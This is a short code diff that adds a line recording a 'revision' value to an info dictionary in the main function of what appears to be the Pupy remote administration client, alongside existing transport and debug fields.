@@ -333,6 +333,7 @@ def main():
     pupy.infos['transport'] = launcher.get_transport()
     pupy.infos['debug'] = debug
     pupy.infos['native'] = not getattr(pupy, 'pseudo', False)
+    pupy.infos['revision'] = getattr(pupy, 'revision', None)
 
     exited = False
 
